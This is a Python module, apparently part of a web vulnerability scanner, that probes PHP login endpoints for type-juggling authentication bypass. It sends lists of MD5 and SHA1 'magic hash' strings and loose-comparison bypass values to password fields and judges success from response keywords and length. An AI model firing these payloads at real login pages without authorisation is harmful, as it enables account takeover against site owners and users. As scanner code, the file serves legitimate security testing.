"""
PHP Type Juggling Scanner Module
Detects authentication bypass via magic hashes and loose comparison
"""

from typing import List, Dict, Any
from core.base_module import BaseModule
from core.logger import get_logger

logger = get_logger(__name__)


class TypeJugglingModule(BaseModule):
    """PHP Type Juggling vulnerability scanner"""

    def __init__(self, module_path: str, payload_limit: int = None):
        """Initialize Type Juggling module"""
        super().__init__(module_path, payload_limit=payload_limit)

        # Magic hashes that when hashed produce 0e... format
        self.magic_hashes = {
            'md5': [
                '240610708', 'QNKCDZO', '0e215962017', 'aabg7XSs', 'aabC9RqS',
                's878926199a', 's155964671a', 's214587387a', 's1091221200a',
            ],
            'sha1': [
                '10932435112', 'aaroZmOk', 'aaK1STfY', 'aaO8zKZF', 'aa3OFF9m',
            ]
        }

        # Direct bypass values
        self.bypass_values = [
            '0e000000000000000000000000000000', '0e462097431906509019562988736854',
            '0', '0e0', 'true', 'false', 'null', '[]', '{}',
        ]

        logger.info(f"Type Juggling module loaded")

    def scan(self, targets: List[Dict[str, Any]], http_client: Any) -> List[Dict[str, Any]]:
        """Scan for PHP Type Juggling vulnerabilities"""
        results = []

        for target in targets:
            url = target.get('url')
            params = target.get('params', {})
            method = target.get('method', 'GET').upper()

            # Only test login-like endpoints
            if not self._is_login_endpoint(url, params):
                continue

            password_fields = ['password', 'passwd', 'pwd', 'pass', 'secret', 'pin']

            for param_name in params:
                if not any(pf in param_name.lower() for pf in password_fields):
                    continue

                # Get baseline
                try:
                    if method == 'POST':
                        baseline = http_client.post(url, data=params)
                    else:
                        baseline = http_client.get(url, params=params)
                    baseline_len = len(baseline.text) if baseline else 0
                except Exception:
                    continue

                # Test magic hashes
                for magic_hash in self.magic_hashes['md5'][:5]:
                    test_params = params.copy()
                    test_params[param_name] = magic_hash

                    try:
                        if method == 'POST':
                            response = http_client.post(url, data=test_params)
                        else:
                            response = http_client.get(url, params=test_params)

                        if response and self._check_bypass(response, baseline_len):
                            results.append(self.create_result(
                                vulnerable=True,
                                url=url,
                                parameter=param_name,
                                payload=magic_hash,
                                evidence=f"Magic hash bypass: {magic_hash} (MD5 produces 0e... hash)",
                                severity='High',
                                method=method,
                                additional_info={
                                    'injection_type': 'PHP Type Juggling',
                                    'cwe': 'CWE-1254',
                                    'owasp': 'A07:2021',
                                    'cvss': 9.8
                                }
                            ))
                            break
                    except Exception:
                        continue

        return results

    def _is_login_endpoint(self, url: str, params: Dict) -> bool:
        """Check if URL looks like a login endpoint"""
        indicators = ['login', 'auth', 'signin', 'password', 'user']
        url_lower = url.lower()
        if any(ind in url_lower for ind in indicators):
            return True
        param_str = ' '.join(str(p).lower() for p in params.keys())
        return any(ind in param_str for ind in indicators)

    def _check_bypass(self, response, baseline_len: int) -> bool:
        """Check if response indicates successful bypass"""
        if not response:
            return False
        text = response.text.lower()
        success = ['welcome', 'dashboard', 'logged in', 'success', 'profile']
        failure = ['invalid', 'incorrect', 'failed', 'error', 'wrong']
        if any(s in text for s in success) and not any(f in text for f in failure):
            return True
        if len(response.text) > baseline_len * 1.5:
            return True
        return False


def get_module(module_path: str, payload_limit: int = None):
    """Factory function to create module instance"""
    return TypeJugglingModule(module_path, payload_limit)
